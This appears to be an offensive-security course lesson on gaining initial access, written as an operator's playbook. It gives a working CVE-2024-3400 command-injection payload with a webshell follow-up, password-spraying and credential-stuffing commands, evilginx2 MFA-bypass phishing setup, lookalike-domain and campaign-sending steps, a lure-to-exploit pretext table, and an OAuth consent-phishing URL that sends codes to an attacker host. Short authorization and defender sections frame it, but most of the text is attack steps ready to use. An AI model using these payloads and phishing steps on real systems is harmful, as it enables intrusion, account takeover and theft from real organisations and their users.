# Initial Access — First Foothold

The first packet that lands inside the target. Everything else — escalation, lateral, exfil — is downstream of this. Mandiant's M-Trends consistently shows three vectors dominate: **exploited public-facing application**, **compromised valid credentials**, and **spear-phishing**. We'll execute each.

> [!warning] Authorized scope only
> Run these only against systems you own or are explicitly authorized to test. Most are direct violations of computer-misuse law otherwise.

## Vector 1 — Exposed services (T1190)

The classic: a vulnerable internet-facing app or appliance. From CISA KEV, the recurring offenders are VPNs, edge firewalls, file-transfer products, mail servers, and bug-tracker / collab apps.

### Find what's exposed

```terminal
# Identify the target's edge
shodan search 'ssl:"target.gov" port:443'
shodan search 'org:"Target Org" "Fortinet"'
shodan search 'org:"Target Org" product:"Ivanti Connect Secure"'
fofa.info 'cert="target.gov" && (header="Citrix" || header="Pulse" || header="Fortinet")'

# Version-specific hunts
shodan search 'http.html:"GlobalProtect Portal" version'
nuclei -u https://vpn.target.gov -t cves/2024/ -severity critical,high
```

### Exploit example — CVE-2024-3400 (PAN-OS GlobalProtect)

```terminal
curl -k 'https://vpn.target.gov/ssl-vpn/hipreport.esp' \
  -H "Cookie: SESSID=/../../../var/appweb/sslvpndocs/global-protect/portal/css/\`id\`"
# After RCE: drop a webshell, pivot to internal LAN
```

> [!tip] Edge devices = crown jewels
> The router/firewall sits between every user and every server. Compromising it gives you traffic visibility, credential capture, and a stable redirector — which is why state actors invest disproportionately in edge 0-days.

## Vector 2 — Identity attacks (T1078, T1110)

Cheaper than 0-day, harder to detect. Most enterprises log a successful login as "normal."

### Password spraying — M365 / Entra

```terminal
# Build a user list from LinkedIn + leaks
# Spray a single common password across all users (avoids lockout per user)
msolspray --userlist users.txt --password 'Spring2026!'

# Or via direct REST against /common/oauth2/token
curl 'https://login.microsoftonline.com/common/oauth2/token' \
  -d 'grant_type=password&username=alice@target.gov&password=Spring2026!&client_id=...'
```

### Stuffing leaked creds

```terminal
# After dehashed/HIBP enrichment
fireprox + ip-rotator → distribute requests across AWS regions to avoid IP block
```

### Phishing the MFA itself (Adversary-in-the-Middle)

```terminal
# evilginx2 — proxies real Microsoft login, captures session cookie
git clone https://github.com/kgretzky/evilginx2 && cd evilginx2 && go build
sudo ./evilginx2 -p ./phishlets
config domain login-target-365.com
phishlets enable o365
lures create o365 → returns URL to send victim
```

> [!danger] AitM defeats classic MFA
> If users authenticate via attacker proxy, attacker steals the **session cookie** post-MFA — bypassing TOTP, SMS, and push. Mitigate with **phishing-resistant MFA**: FIDO2 hardware keys or platform passkeys, plus **conditional access** that binds session to compliant device.

## Vector 3 — Spear-phishing (T1566)

Still the #1 entry for nation-state campaigns. Effectiveness comes from **pretext quality**, not exploit novelty.

### Craft the pretext

Map this to your target dossier from the Target-Selection lesson:

| Pretext archetype | Trigger | Attachment / link |
|------------------|---------|-------------------|
| Conference invite | upcoming event the target attends | "Agenda.pdf" → CVE-2023-38831 WinRAR |
| HR / payroll | quarterly cycle | "Payslip Q1.html" → AitM |
| Vendor invoice | known supplier | "Invoice 2026-04.docx" → MSDT (Follina) |
| Government RFP | sector-specific | "Tender response.zip" → ISO with LNK |

### Build & send

```terminal
# Domain that looks legitimate (typosquat or brand impersonation)
proxychains certbot certonly --standalone -d login-target-365.com

# SPF/DKIM/DMARC for the lookalike domain (must pass to land in inbox)
dig +short TXT login-target-365.com  # add v=spf1 ... -all

# Send via gophish or evilginx
gophish admin → campaign → import targets.csv → launch
```

### Payload chains that actually work in 2024–2026

- **HTML smuggling**: HTML attachment builds the malicious file in browser memory; bypasses email gateways.
- **Container files** (ISO/IMG/VHD): mount points strip MoTW, so embedded LNK runs without SmartScreen prompt.
- **OneNote / .lnk in archive**: still landing past mail filters at many tenants.
- **OAuth consent phishing**: no malware needed — convince the user to grant a malicious Azure app `Mail.Read`. Persistent and silent.

```terminal
# OAuth consent example
https://login.microsoftonline.com/common/oauth2/v2.0/authorize?
  client_id=<EVIL_APP>&response_type=code&redirect_uri=https://attacker.tld/cb
  &scope=offline_access+Mail.Read+Files.Read.All+User.Read
```

## Vector 4 — Supply chain & trust relationship (T1195, T1199)

Hit a smaller, weaker vendor that already has access to the real target. We have a dedicated lesson on this.

## Vector 5 — Removable media / physical (T1091, T1200)

Still used by state actors against air-gapped or high-trust networks. Drop USB at conference, malicious cable in hotel room, BadUSB at reception.

## Operator checklist before sending

> [!info] Pre-flight checks
> 1. **Sender domain warmed** for ≥ 7 days, SPF/DKIM/DMARC aligned.
> 2. **Phishlet tested** end-to-end with your own throwaway account.
> 3. **Redirector** (Cloudflare Worker / Azure Front Door) in front of payload host.
> 4. **Time of send** matches target work hours and a believable internal trigger.
> 5. **Logging** of who clicked, who entered creds, who reached MFA — attribution + audit.

## Defender takeaways

- **Identity is the new perimeter** — invest in conditional access, phishing-resistant MFA, impossible-travel detection, OAuth app review.
- **Patch your edge weekly** — anything in CISA KEV affecting your VPN/firewall/file-transfer is being mass-scanned within 24h of disclosure.
- **DMARC enforce + lookalike monitoring** — block spoof of your domain, alert on registrations of typosquats.
- **Detonate attachments** — sandbox with internet egress; flag HTML smuggling, ISO mounts, OneNote with embeds.
- **User reporting** — a one-click "report phish" button cuts dwell time more than any AI filter.
